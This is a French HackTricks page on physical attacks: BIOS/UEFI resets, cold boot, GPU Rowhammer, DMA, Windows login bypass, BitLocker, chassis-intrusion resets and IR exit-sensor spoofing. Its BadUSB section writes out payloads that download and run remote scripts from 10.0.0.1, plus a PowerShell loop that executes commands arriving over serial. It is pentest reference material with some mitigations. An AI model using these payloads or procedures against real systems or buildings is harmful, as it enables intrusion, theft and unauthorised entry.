# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## Récupération du mot de passe du BIOS et sécurité du système

**Réinitialiser le BIOS** peut être fait de plusieurs façons. La plupart des cartes mères incluent une **batterie** qui, lorsqu’elle est retirée pendant environ **30 minutes**, réinitialise les paramètres du BIOS, y compris le mot de passe. Sinon, un **jumper sur la carte mère** peut être ajusté pour réinitialiser ces paramètres en reliant des broches spécifiques.

Dans les situations où les ajustements matériels ne sont pas possibles ou pratiques, des **outils software** offrent une solution. Faire démarrer un système depuis un **Live CD/USB** avec des distributions comme **Kali Linux** donne accès à des outils comme **_killCmos_** et **_CmosPWD_**, qui peuvent aider à la récupération du mot de passe du BIOS.

Dans les cas où le mot de passe du BIOS est inconnu, le saisir incorrectement **trois fois** entraîne généralement un code d’erreur. Ce code peut être utilisé sur des sites comme [https://bios-pw.org](https://bios-pw.org) pour potentiellement récupérer un mot de passe utilisable.

### Sécurité UEFI

Pour les systèmes modernes utilisant **UEFI** au lieu du BIOS traditionnel, l’outil **chipsec** peut être utilisé pour analyser et modifier les paramètres UEFI, y compris la désactivation de **Secure Boot**. Cela peut être réalisé avec la commande suivante :
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## Analyse de la RAM et attaques Cold Boot

La RAM conserve les données brièvement après coupure de l’alimentation, généralement pendant **1 à 2 minutes**. Cette persistance peut être prolongée jusqu’à **10 minutes** en appliquant des substances froides, comme de l’azote liquide. Pendant cette période prolongée, un **memory dump** peut être créé à l’aide d’outils comme **dd.exe** et **volatility** pour analyse.

---

## GPU Rowhammer contre les tables de pages

Les attaques modernes de GPU Rowhammer deviennent beaucoup plus utiles lorsqu’elles ciblent les **métadonnées de mémoire virtuelle du GPU** plutôt que des buffers ordinaires. Des travaux récents sur des **GDDR6 NVIDIA Ampere GPUs** montrent qu’un attaquant exécutant du code CUDA non privilégié peut construire des motifs de hammering spécifiques au GPU, utiliser le **memory massaging** pour placer les structures de pagination dans des lignes vulnérables, puis inverser des bits dans la **last-level page table** ou dans un **page directory** intermédiaire. Une fois qu’une seule entrée de traduction est corrompue, l’attaquant peut amorcer un **arbitrary GPU memory read/write** puis pivoter vers une compromission de l’hôte.

### Schéma d’exploitation

1. **Profiler les lignes hammerables** dans la GDDR6 et construire des motifs de hammering sensibles au refresh / non uniformes qui contournent les mitigations in-DRAM.
2. **Massage GPU allocations** afin que le pilote place les structures de traduction de pages dans des emplacements physiques hammerables au lieu de les conserver dans le pool protégé par défaut. En pratique, cela peut consister à épuiser la région des page-tables en basse mémoire et à faire du spray de grandes mappings UVM clairsemées avec des strides contrôlés.
3. **Inverser les métadonnées de traduction** comme des bits **PFN** ou liés à l’aperture à l’intérieur d’une entrée de page-table / page-directory afin que la page virtuelle contrôlée par l’attaquant se résolve vers des pages de page-table, de la mémoire GPU arbitraire ou des mappings système visibles par l’hôte.
4. Réutiliser le mapping forgé pour réécrire d’autres entrées de traduction et s’élever vers un **arbitrary GPU memory read/write** à travers les contextes GPU.

### Pivot vers l’hôte et mitigations

- Avec **IOMMU disabled**, des mappings d’aperture système forgés peuvent exposer une mémoire physique de l’hôte arbitraire au GPU, transformant la primitive GPU en compromission complète de l’hôte.
- **GDDRHammer** cible les entrées de page-table de dernier niveau, tandis que **GeForge** montre que corrompre un niveau de page-directory peut être plus simple car un seul bit flip peut rediriger un sous-arbre de traduction plus large. Ne considérez pas une seule couche de pagination comme critique pour la sécurité.
- **IOMMU** reste important car il bloque le chemin direct vers la mémoire hôte arbitraire utilisé par GDDRHammer/GeForge, mais ce n’est **pas une mitigation complète**. **GPUBreach** montre un pivot de seconde phase où l’attaquant corrompt des buffers CPU inscriptibles par le GPU et appartenant au pilote, puis déclenche des bugs de sécurité mémoire du pilote NVIDIA pour obtenir une primitive d’écriture kernel et un **root shell** même avec IOMMU activé.
- **System-level ECC** est une mesure de durcissement pratique sur les GPUs workstation/server pris en charge. Les GPUs grand public sans ECC exposent une surface de défense plus faible.
- Ces attaques ne sont pas purement théoriques : **GeForge** a signalé **1 171** bit flips sur un RTX 3060 et **202** sur un RTX A6000, ce qui suffisait pour construire une chaîne opérationnelle d’élévation de privilèges sur l’hôte.

---

## Attaques Direct Memory Access (DMA)

**INCEPTION** est un outil conçu pour la **physical memory manipulation** via DMA, compatible avec des interfaces comme **FireWire** et **Thunderbolt**. Il permet de contourner les procédures de connexion en patchant la mémoire pour accepter n’importe quel mot de passe. Cependant, il est inefficace contre les systèmes **Windows 10**.

---

## Live CD/USB pour l’accès au système

Remplacer des binaires système comme **_sethc.exe_** ou **_Utilman.exe_** par une copie de **_cmd.exe_** peut fournir une invite de commande avec des privilèges système. Des outils comme **chntpw** peuvent être utilisés pour modifier le fichier **SAM** d’une installation Windows, ce qui permet de changer les mots de passe.

**Kon-Boot** est un outil qui facilite la connexion à des systèmes Windows sans connaître le mot de passe en modifiant temporairement le kernel Windows ou l’UEFI. Plus d’informations sont disponibles à [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Gestion des fonctionnalités de sécurité Windows

### Raccourcis de boot et de recovery

- **Supr** : Accéder aux paramètres BIOS.
- **F8** : Entrer en mode Recovery.
- Appuyer sur **Shift** après la bannière Windows peut contourner l’autologon.

### Périphériques BAD USB

Des périphériques comme **Rubber Ducky** et **Teensyduino** servent de plateformes pour créer des dispositifs **bad USB**, capables d’exécuter des payloads prédéfinis lorsqu’ils sont connectés à un ordinateur cible.

### Volume Shadow Copy

Les privilèges administrateur permettent de créer des copies de fichiers sensibles, y compris le fichier **SAM**, via PowerShell.

## Techniques BadUSB / HID Implant

### Implants de câble gérés en Wi-Fi

- Des implants basés sur ESP32-S3 comme **Evil Crow Cable Wind** se dissimulent dans des câbles USB-A→USB-C ou USB-C↔USB-C, s’énumèrent uniquement comme un clavier USB, et exposent leur pile C2 via Wi-Fi. L’opérateur doit seulement alimenter le câble depuis l’hôte victime, créer un hotspot nommé `Evil Crow Cable Wind` avec le mot de passe `123456789`, puis naviguer vers [http://cable-wind.local/](http://cable-wind.local/) (ou son adresse DHCP) pour atteindre l’interface HTTP embarquée.
- L’interface web fournit des onglets pour *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, et *Config*. Les payloads stockés sont étiquetés par OS, les layouts clavier sont changés à la volée, et les chaînes VID/PID peuvent être modifiées pour imiter des périphériques connus.
- Comme le C2 vit dans le câble, un téléphone peut préparer des payloads, déclencher l’exécution et gérer les identifiants Wi-Fi sans toucher à l’OS hôte — idéal pour des intrusions physiques de courte durée.

### Payloads AutoExec sensibles à l’OS

- Les règles AutoExec lient un ou plusieurs payloads pour s’exécuter immédiatement après l’énumération USB. L’implant effectue un fingerprinting OS léger et sélectionne le script correspondant.
- Exemple de workflow :
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) ou `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Comme l’exécution est sans supervision, le simple fait de remplacer un câble de charge peut permettre un accès initial “plug-and-pwn” dans le contexte de l’utilisateur connecté.

### Remote shell over Wi-Fi TCP amorcé par HID

1. **Amorçage par frappe clavier:** Un payload stocké ouvre une console et colle une boucle qui exécute tout ce qui arrive sur le nouveau périphérique série USB. Une variante Windows minimale est :
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** L’implant maintient le canal USB CDC ouvert pendant que son ESP32-S3 lance un client TCP (script Python, APK Android, ou exécutable desktop) vers l’opérateur. Tous les octets saisis dans la session TCP sont transmis dans la boucle série ci-dessus, donnant une exécution de commandes à distance même sur des hôtes air-gapped. La sortie est limitée, donc les opérateurs exécutent généralement des commandes aveugles (création de compte, staging d’outils supplémentaires, etc.).

### HTTP OTA update surface

- La même pile web expose généralement des mises à jour de firmware non authentifiées. Evil Crow Cable Wind écoute sur `/update` et flashe n’importe quel binaire téléversé :
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Les opérateurs sur le terrain peuvent permuter des fonctionnalités à chaud (par ex., flasher le firmware USB Army Knife) en plein engagement sans ouvrir le câble, ce qui permet à l'implant de pivoter vers de nouvelles capacités tout en restant branché sur l'hôte cible.

## Contournement du chiffrement BitLocker

Le chiffrement BitLocker peut potentiellement être contourné si le **mot de passe de récupération** est trouvé dans un fichier de dump mémoire (**MEMORY.DMP**). Des outils comme **Elcomsoft Forensic Disk Decryptor** ou **Passware Kit Forensic** peuvent être utilisés à cette fin.

---

## Ingénierie sociale pour l'ajout de la clé de récupération

Une nouvelle clé de récupération BitLocker peut être ajoutée par des techniques d'ingénierie sociale, en convainquant un utilisateur d'exécuter une commande qui ajoute une nouvelle clé de récupération composée de zéros, simplifiant ainsi le processus de déchiffrement.

---

## Exploiter les commutateurs d'intrusion du châssis / de maintenance pour réinitialiser le BIOS aux paramètres d'usine

De nombreux ordinateurs portables modernes et PC de bureau au format compact incluent un **chassis-intrusion switch** surveillé par l'Embedded Controller (EC) et le firmware BIOS/UEFI.  Bien que le but principal du commutateur soit de déclencher une alerte lorsqu'un appareil est ouvert, les fournisseurs mettent parfois en œuvre un **raccourci de récupération non documenté** déclenché lorsque le commutateur est basculé selon un schéma précis.

### Comment l'attaque fonctionne

1. Le commutateur est câblé sur une **interruption GPIO** de l'EC.
2. Le firmware exécuté sur l'EC garde une trace du **timing et du nombre d'appuis**.
3. Lorsqu'un schéma codé en dur est reconnu, l'EC invoque une routine *mainboard-reset* qui **efface le contenu du NVRAM/CMOS système**.
4. Au prochain démarrage, le BIOS charge les valeurs par défaut – le **mot de passe superviseur, les clés Secure Boot et toute configuration personnalisée sont effacés**.

> Une fois Secure Boot désactivé et le mot de passe du firmware supprimé, l'attaquant peut simplement démarrer n'importe quelle image OS externe et obtenir un accès sans restriction aux disques internes.

### Exemple réel – Ordinateur portable Framework 13

Le raccourci de récupération pour le Framework 13 (11th/12th/13th-gen) est :
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Après le dixième cycle, l’EC définit un flag qui indique au BIOS d’effacer le NVRAM au prochain reboot. La procédure complète prend ~40 s et ne nécessite **rien d’autre qu’un tournevis**.

### Procédure Générique d’Exploitation

1. Allumez le système ou faites un suspend-resume de la cible afin que l’EC soit en cours d’exécution.
2. Retirez le capot inférieur pour exposer le switch d’intrusion/maintenance.
3. Reproduisez le pattern de bascule spécifique au vendor (consultez la documentation, les forums, ou reverse-engineer le firmware de l’EC).
4. Réassemblez et reboot – les protections du firmware devraient être désactivées.
5. Démarrez un live USB (par ex. Kali Linux) et effectuez le post-exploitation habituel (credential dumping, data exfiltration, implantation de binaires EFI malveillants, etc.).

### Détection & Mitigation

* Journalisez les événements de chassis-intrusion dans la console de gestion de l’OS et corrélez-les avec des BIOS resets inattendus.
* Utilisez des **tamper-evident seals** sur les vis/capots pour détecter une ouverture.
* Conservez les appareils dans des **physically controlled areas** ; considérez qu’un accès physique équivaut à une compromission totale.
* Lorsque c’est possible, désactivez la fonctionnalité vendor “maintenance switch reset” ou exigez une autorisation cryptographique supplémentaire pour les resets NVRAM.

---

## Injection IR furtive contre les capteurs de sortie sans contact

### Caractéristiques du capteur
- Les capteurs “wave-to-exit” du commerce associent un émetteur LED near-IR à un module récepteur de type télécommande TV qui ne renvoie un niveau logique haut qu’après avoir vu plusieurs impulsions (~4–10) de la bonne porteuse (≈30 kHz).
- Un carter plastique empêche l’émetteur et le récepteur de se voir directement, donc le contrôleur suppose que toute porteuse validée provient d’une réflexion proche et active un relais qui ouvre la gâche de la porte.
- Une fois que le contrôleur croit qu’une cible est présente, il modifie souvent l’enveloppe de modulation sortante, mais le récepteur continue d’accepter toute rafale correspondant à la porteuse filtrée.

### Flux d’attaque
1. **Capturez le profil d’émission** – clippez un analyseur logique sur les pins du contrôleur pour enregistrer les formes d’onde avant détection et après détection qui pilotent la LED IR interne.
2. **Rejouez uniquement la forme d’onde “post-detection”** – retirez/ignorez l’émetteur d’origine et pilotez une LED IR externe avec le pattern déjà déclenché dès le départ. Comme le récepteur ne s’intéresse qu’au nombre d’impulsions et à la fréquence, il traite la porteuse usurpée comme une réflexion légitime et active la ligne du relais.
3. **Gâtez la transmission** – transmettez la porteuse en rafales calibrées (par ex. dizaines de millisecondes activées, durée similaire désactivée) pour fournir le minimum de nombre d’impulsions sans saturer l’AGC du récepteur ni sa logique de gestion des interférences. Une émission continue désensibilise rapidement le capteur et empêche le relais de s’actionner.

### Injection réfléchie à longue portée
- Remplacer la LED de banc par une diode IR haute puissance, un driver MOSFET et des optiques de focalisation permet un déclenchement fiable à ~6 m.
- L’attaquant n’a pas besoin d’une ligne de visée vers l’ouverture du récepteur ; viser les murs intérieurs, les étagères ou les encadrements de porte visibles à travers le verre permet à l’énergie réfléchie d’entrer dans le champ de vision d’environ 30° et mime un geste de la main à courte portée.
- Comme les récepteurs attendent seulement de faibles réflexions, un faisceau externe beaucoup plus puissant peut rebondir sur plusieurs surfaces tout en restant au-dessus du seuil de détection.

### Torche d’attaque weaponised
- Intégrer le driver dans une lampe de poche commerciale dissimule l’outil en pleine vue. Remplacez la LED visible par une LED IR haute puissance adaptée à la bande du récepteur, ajoutez un ATtiny412 (ou équivalent) pour générer les rafales ≈30 kHz, et utilisez un MOSFET pour absorber le courant de la LED.
- Une lentille zoom télescopique resserre le faisceau pour la portée et la précision, tandis qu’un moteur de vibration contrôlé par le MCU fournit une confirmation haptique que la modulation est active sans émettre de lumière visible.
- Le fait d’alterner plusieurs patterns de modulation stockés (fréquences de porteuse et enveloppes légèrement différentes) augmente la compatibilité entre familles de capteurs rebadgées, permettant à l’opérateur de balayer les surfaces réfléchissantes jusqu’à ce que le relais clique audiblement et que la porte se libère.

---

## Références

- [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
